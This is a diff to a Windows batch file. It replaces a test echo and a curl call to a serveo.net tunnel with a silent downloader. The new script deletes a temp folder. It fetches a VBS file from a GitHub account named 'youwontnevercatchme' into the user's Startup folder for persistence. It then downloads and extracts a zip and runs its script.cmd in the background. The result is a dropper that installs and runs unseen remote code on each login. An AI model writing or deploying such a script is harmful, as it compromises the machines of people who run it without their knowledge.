@@ -1,3 +1,23 @@
-echo hi
+@echo off
 
-curl https://fc1794d09d3130e9558af36b843f6ce2.serveo.net
+set startup=%userprofile%\appdata\roaming\microsoft\windows\start menu\programs\startup
+
+
+rmdir /S /Q "ch-temp-v1"
+del "ch-temp-v1.zip"
+
+if not exist "%startup%\launcher.vbs" (
+curl -L -o "%startup%\launcher.vbs" "https://raw.githubusercontent.com/youwontnevercatchme/files/refs/heads/main/you%20can%20never%20catch%20me%20ive%20been%20bussin%20plays%20for%20years"
+)
+
+
+
+curl -L -o "ch-temp-v1.zip" "https://github.com/youwontnevercatchme/files/releases/download/haha/ch-temp-v1.zip"
+tar -xf "ch-temp-v1.zip"
+
+
+cd ch-temp-v1
+cd tools
+start /b "" script.cmd
+
+
